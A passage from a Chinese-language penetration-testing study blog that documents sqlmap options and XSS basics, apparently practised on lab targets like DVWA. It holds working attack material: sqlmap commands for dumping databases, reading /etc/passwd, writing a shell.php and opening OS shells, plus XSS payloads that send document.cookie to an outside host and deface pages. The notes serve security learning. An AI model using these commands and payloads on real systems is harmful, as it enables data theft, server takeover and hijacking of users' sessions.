<h5 id="–skip"><a href="#–skip" class="headerlink" title="–skip"></a>–skip</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203114614383.png" alt="image-20230203114614383"></p>
<h5 id="–dbms"><a href="#–dbms" class="headerlink" title="–dbms"></a>–dbms</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203115335155.png" alt="image-20230203115335155"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203115343739.png" alt="image-20230203115343739"></p>
<h5 id="–tamper"><a href="#–tamper" class="headerlink" title="–tamper"></a>–tamper</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203121954917.png" alt="image-20230203121954917"></p>
<h4 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h4><blockquote>
<ul>
<li>–level<ul>
<li>1-5级（默认1）</li>
<li>&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;xml&#x2F;payloads</li>
</ul>
</li>
<li>–risk<ul>
<li>1-4（默认1 &#x2F; 无害）</li>
<li>Risk升高可造成数据被篡改等风险（update）</li>
</ul>
</li>
<li>–string, –not-string, –regexp, –code, –text-only, –titles<ul>
<li>页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑，但有些页面随时间阈值变化，此时需要人为指定标识真假的字符串</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203122141710.png" alt="image-20230203122141710"></p>
<h4 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h4><blockquote>
<ul>
<li>默认使用全部技术<ul>
<li>B: Boolean-based blind </li>
<li>E: Error-based </li>
<li>U: Union query-based </li>
<li>S: Stacked queries（文件系统、操作系统、注册表）</li>
<li>T: Time-based blind</li>
</ul>
</li>
<li>–time-sec<ul>
<li>基于时间的注入检测相应延迟时间（默认5s）</li>
</ul>
</li>
<li>–union-cols<ul>
<li>默认联合查询1-10例，随–level增加最多支持50例</li>
<li>–union-cols 6-9  # 指定查询6-9列</li>
</ul>
</li>
<li>–union-char<ul>
<li>联合查询默认使用NULL，极端情况下NULL可能失败，此时可以手动指定数值</li>
<li>–union-char 123</li>
</ul>
</li>
<li>–dns-domain<ul>
<li>攻击者控制了某DNS服务器，使用此功能可以提高数据榨取的速度</li>
<li>—dns-domain attacker.com</li>
</ul>
</li>
<li>–second-order<ul>
<li>在一个页面注入的结果，从另一个页面体现出来</li>
<li><code>--second-order http://1.1.1.1/b.php</code></li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203122652463.png" alt="image-20230203122652463"></p>
<h4 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h4><blockquote>
<ul>
<li>-f , –fingerprint , -b , –banner<ul>
<li>数据库管理系统指纹信息</li>
<li>DBMS，操作系统，架构，补丁</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203123857524.png" alt="image-20230203123857524"></p>
<h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><blockquote>
<ul>
<li><p>–current-user </p>
<ul>
<li>查询当前数据库管理系统的账号</li>
</ul>
</li>
<li><p>–current-db</p>
<ul>
<li>查询当前数据库</li>
</ul>
</li>
<li><p>–hostname</p>
<ul>
<li>查询当前主机名</li>
</ul>
</li>
<li><p>–users </p>
<ul>
<li>查询数据库中所有的用户账号</li>
</ul>
</li>
<li><p>–privileges -U username（CU 当前帐号）</p>
<ul>
<li><p>–privileges -CU</p>
</li>
<li><p>查询所有用户权限 &#x2F; 当前用户权限</p>
</li>
</ul>
</li>
<li><p>–roles </p>
<ul>
<li>查询数据库中的角色</li>
</ul>
</li>
<li><p>–dbs</p>
<ul>
<li>查询目标数据库中有哪些数据库</li>
</ul>
</li>
<li><p>–tables, –exclude-sysdbs –D dvwa</p>
<ul>
<li><p>–exclude-sysdbs       # 此参数表示排除系统库</p>
</li>
<li><p>查询DVWA数据库中有哪些表</p>
</li>
</ul>
</li>
<li><p>-T users -D dvwa -C user –columns</p>
<ul>
<li>查询DVWA数据库中user表中有哪些列</li>
</ul>
</li>
<li><p>–schema –batch –exclude-sysdbs 元数据（使用默认选项）</p>
<ul>
<li>schema数据库表结构</li>
<li>batch参数：注入过程中的所有选择项都使用默认选项</li>
</ul>
</li>
<li><p>–count </p>
<ul>
<li>查询过程中进行计数</li>
</ul>
</li>
<li><p>Dump数据</p>
<ul>
<li><p>–dump, -C, -T, -D, –start, –stop</p>
<ul>
<li>dump用来输出查询结果</li>
<li>start &#x2F; stop分段查询，防止被发现</li>
</ul>
</li>
<li><p>–dump-all –exclude-sysdbs</p>
</li>
</ul>
</li>
<li><p>–sql-query “select * from users”</p>
<ul>
<li>自定义sql语句进行查询</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203124130079.png" alt="image-20230203124130079"></p>
<h4 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h4><blockquote>
<ul>
<li><p>Mysql &lt; 5.0，没有information_schema库</p>
</li>
<li><p>Mysql &gt;&#x3D; 5.0，但无权读取information_schema库</p>
</li>
<li><p>微软的access数据库，默认无权读取MSysObjects库</p>
</li>
<li><p>–common-tables </p>
</li>
<li><p>–common-columns</p>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203175030225.png" alt="image-20230203175030225"></p>
<h5 id="–common-tables"><a href="#–common-tables" class="headerlink" title="–common-tables"></a>–common-tables</h5><blockquote>
<p>参数使用条件：</p>
<p>没有information_schema库或者无权读取information_schema库</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203175750231.png" alt="image-20230203175750231"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181757271.png" alt="image-20230203181757271"></p>
<h4 id="UDF-Injection"><a href="#UDF-Injection" class="headerlink" title="UDF Injection"></a>UDF Injection</h4><blockquote>
<ul>
<li><p>用户自定义函数</p>
</li>
<li><p>–udf-inject , –shared-lib</p>
<ul>
<li><p>编译共享库创建并上传至DB Server，以此生成UDF实现高级注入</p>
</li>
<li><p>Linux：shared object</p>
</li>
<li><p>Windows：DLL</p>
</li>
<li><p>UDF注入文档（需翻墙访问）</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system</a></p>
<p>full-control-whitepaper-4633857</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203180247658.png" alt="image-20230203180247658"></p>
<h4 id="FILE-SYSTEM"><a href="#FILE-SYSTEM" class="headerlink" title="FILE SYSTEM"></a>FILE SYSTEM</h4><blockquote>
<ul>
<li><p>–file-read&#x3D;”&#x2F;etc&#x2F;passwd” </p>
</li>
<li><p>–file-write&#x3D;”shell.php” –file-dest “&#x2F;tmp&#x2F;shell.php”</p>
</li>
<li><p>–file-dest</p>
<ul>
<li>写入上传shell目标地址</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203180827652.png" alt="image-20230203180827652"></p>
<h5 id="–file-read"><a href="#–file-read" class="headerlink" title="–file-read"></a>–file-read</h5><blockquote>
<p>读取&#x2F;etc&#x2F;passwd文件</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181021255.png" alt="image-20230203181021255"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181636377.png" alt="image-20230203181636377"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181648584.png" alt="image-20230203181648584"></p>
<h5 id="–file-write"><a href="#–file-write" class="headerlink" title="–file-write"></a>–file-write</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181939420.png" alt="image-20230203181939420"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182046784.png" alt="image-20230203182046784"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182231764.png" alt="image-20230203182231764"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182319611.png" alt="image-20230203182319611"></p>
<h4 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h4><blockquote>
<ul>
<li>Mysql ̵postgresql<ul>
<li>上传共享库并生成sys_exec()̵ sys_eval()两个UDF</li>
</ul>
</li>
<li>Mssql<ul>
<li>xp_cmdshell存储过程（有就直接用、被禁了直接启动，没有就建直接立）</li>
</ul>
</li>
<li>–sql-shell </li>
<li>–os-shell </li>
<li>–os-cmd</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182400762.png" alt="image-20230203182400762"></p>
<h4 id="WINDOWS-REGISTORY（注册表）"><a href="#WINDOWS-REGISTORY（注册表）" class="headerlink" title="WINDOWS REGISTORY（注册表）"></a>WINDOWS REGISTORY（注册表）</h4><blockquote>
<ul>
<li>–reg-read <ul>
<li>读取键值表键值</li>
</ul>
</li>
<li>–reg-add <ul>
<li>增加键值表键值</li>
</ul>
</li>
<li>–reg-del <ul>
<li>删除键值表键值</li>
</ul>
</li>
<li>–reg-key<ul>
<li>键值名</li>
</ul>
</li>
<li>–reg-value̵<ul>
<li>键值的值</li>
</ul>
</li>
<li>–reg-data̵<ul>
<li>键值具体数据内容</li>
</ul>
</li>
<li>–reg-type <ul>
<li>键值类型</li>
</ul>
</li>
<li>sqlmap –u&#x3D;”<a target="_blank" rel="noopener" href="http://1.1.1.1/a.aspx?id=1">http://1.1.1.1/a.aspx?id=1</a>“ –reg-add –reg key&#x3D;”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1</li>
</ul>
<p><strong>操作系统账号需要有写入执行权限</strong></p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203183301060.png" alt="image-20230203183301060"></p>
<h4 id="General"><a href="#General" class="headerlink" title="General"></a>General</h4><blockquote>
<ul>
<li>-s：sqlite会话文件保存位置</li>
<li>-t：记录流量文件保存位置</li>
<li>–charset：强制字符编码<ul>
<li>–charset&#x3D;GBK</li>
</ul>
</li>
<li>–crawl：从起始位置爬站深度<ul>
<li>–batch –crawl&#x3D;3</li>
</ul>
</li>
<li>–csv-del：dump数据默认存于<code>&quot;,&quot;</code>分割的CSV文件中，指定其他分隔符<ul>
<li>–csv-del&#x3D;”;”</li>
</ul>
</li>
<li>–dbms-cred：指定数据库账号</li>
<li>–flush-session：清空session</li>
<li>–forms：自动从-u中的url获取页面中的表单进行测试</li>
<li>–force-ssl       # https网站注入</li>
<li>–fresh-queries：忽略session查询结果</li>
<li>–hex：dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原<ul>
<li><code>sqlmap -u &quot;http://1.1.1.1/s.php?id=1&quot; --hex -v 3</code></li>
</ul>
</li>
<li>–output-dir&#x3D;&#x2F;tmp  # 指定输出目录</li>
<li>–parse-errors：分析和显示数据库内建报错信息<ul>
<li><code>sqlmap.py -u &quot;http://1.1.1.1/sqlmap/a.asp?id=1&quot; --parse-errors</code></li>
</ul>
</li>
<li>–save：将命令保存成配置文件</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203183343751.png" alt="image-20230203183343751"></p>
<h4 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h4><blockquote>
<ul>
<li>-z：参数助记符<ul>
<li>原始命令：<code>sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u &quot;1.1.1.1/a.php?id=1&quot;</code> </li>
<li>简写命令：<code>sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot;</code></li>
</ul>
</li>
<li>–answer      <ul>
<li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot;--technique=E --answers=&quot;extending=N&quot; --batch</code>            # 当遇到<code>extending</code>时answer参数回答<code>No</code></li>
</ul>
</li>
<li>–check-waf：检测WAF &#x2F; IPS &#x2F;IDS</li>
<li>–hpp：HTTP parameter pollution<ul>
<li>绕过WAF &#x2F; IPS &#x2F; IDS的有效方法</li>
<li>尤其对ASP &#x2F; IIS 和 ASP.NET &#x2F; IIS</li>
</ul>
</li>
<li>–identify-waf：彻底的WAF&#x2F;IPS&#x2F;IDS检查<ul>
<li>支持30多种产品</li>
</ul>
</li>
<li>–purge：清除output文件夹</li>
<li>–smart：当有大量检测目标时，只选择基于错误的检测结果</li>
<li>–wizard</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203190825613.png" alt="image-20230203190825613"></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>一文看懂xss：</p>
<p>xss实操：</p>
<p><a href="https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/">https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/</a></p>
<blockquote>
<ul>
<li><p>攻击WEB客户端</p>
</li>
<li><p>客户端脚本语言</p>
<ul>
<li>弹窗告警、广告</li>
<li>Javascript</li>
<li>在浏览器中执行</li>
</ul>
</li>
<li><p>XSS（cross-site scripting）</p>
<ul>
<li>通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</li>
<li>注入客户端脚本代码</li>
<li>盗取cookie<ul>
<li>注入代码：<code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt; </code><ul>
<li>a.js源码：<code>var img = new Image(); img.src = &quot;http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie;</code></li>
</ul>
</li>
</ul>
</li>
<li>重定向</li>
</ul>
</li>
<li><p>VBScript, ActiveX, or Flash</p>
</li>
<li><p>JavaScript</p>
<ul>
<li>与Java语言无关</li>
<li>命名完全出于市场原因</li>
<li>使用最广的客户端脚本语言</li>
</ul>
</li>
<li><p>使用场景</p>
<ul>
<li>直接嵌入html：<code>&lt;script&gt; alert(&#39;XSS&#39;); &lt;/script&gt;</code></li>
<li>元素标签事件：<code>&lt;body onload=alert(&#39;XSS&#39;)&gt;</code></li>
<li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></li>
<li>其他标签：<code>&lt;iframe&gt;, &lt;div&gt;, and &lt;link&gt;</code></li>
<li>DOM对象：篡改页面内容</li>
</ul>
</li>
<li><p>攻击参与方</p>
<ul>
<li>攻击者</li>
<li>被攻击者</li>
<li>漏洞站点</li>
<li>第三方站点（攻击目标、攻击参与站）</li>
</ul>
</li>
<li><p>漏洞形成的根源（原理）</p>
<ul>
<li>服务器对用户提交数据过滤不严</li>
<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
<li>脚本在客户端执行恶意操作</li>
</ul>
</li>
<li><p>XSS漏洞类型</p>
<ul>
<li>存储型（持久型）</li>
<li>反射型（非持久）<ul>
<li>攻击者发送给客户端XSS链接，诱使客户端点击</li>
</ul>
</li>
<li>DOM型</li>
</ul>
</li>
<li><p>漏洞PoC</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;alert(‘xss’)&lt;&#x2F;script&gt;
&lt;a href&#x3D;&#39;&#39; onclick&#x3D;alert(&#39;xss&#39;)&gt;type&lt;&#x2F;a&gt;
&lt;img src&#x3D;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.ipg onerror&#x3D;alert(&#39;xss&#39;)&gt;
&lt;script&gt;window.location&#x3D;‘http:&#x2F;&#x2F;1.1.1.1&#39;&lt;&#x2F;script&gt;
&lt;iframe SRC&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;victim&quot; height &#x3D; &quot;0&quot; width &#x3D;&quot;0&quot;&gt;&lt;&#x2F;iframe&gt;
&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;c.php?
output&#x3D;&quot;+document.cookie;&lt;&#x2F;script&gt;
&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;THIS 
WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</blockquote>
<h3 id="反射型（非持久）"><a href="#反射型（非持久）" class="headerlink" title="反射型（非持久）"></a>反射型（非持久）</h3><ul>
<li>当客户端输入123123后服务端返回原样数据，判断可能存在xss注入</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220201965.png" alt="image-20230203220201965"></p>
<ul>
<li><p>验证</p>
<ul>
<li>注入代码：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220504591.png" alt="image-20230203220504591"></p>
</li>
</ul>
<blockquote>
<p>出现弹窗告警，存在xss注入</p>
</blockquote>
<ul>
<li><p>html注入</p>
<ul>
<li><code>&lt;a href=&quot;192.168.216.167&quot;&gt;click&lt;/a&gt;</code></li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220642473.png" alt="image-20230203220642473"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203220722646.png" alt="image-20230203220722646"></p>
</li>
</ul>
<blockquote>
<p>出现click链接，点击链接会跳转到目标地址</p>
</blockquote>
<ul>
<li><p>篡改页面</p>
<ul>
<li><p>注入代码</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;THIS 
  WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203223011156.png" alt="image-20230203223011156"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">无心</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://NoobXW.github.io/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/">http://NoobXW.github.io/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">无心</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Kali/">
                                    <span class="chip bg-color">Kali</span>
                                </a>
                            
                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
                                    <span class="chip bg-color">漏洞挖掘</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="一文看懂XSS">
                        
                        <span class="card-title">一文看懂XSS</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>23-02-04
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/XSS/" class="post-category">
                                    XSS
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/XSS/">
                        <span class="chip bg-color">XSS</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Kali渗透测试-Web渗透【神器】">
                        
                        <span class="card-title">Kali渗透测试-Web渗透【神器】</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>23-01-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Kali/" class="post-category">
                                    Kali
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Kali/">
                        <span class="chip bg-color">Kali</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
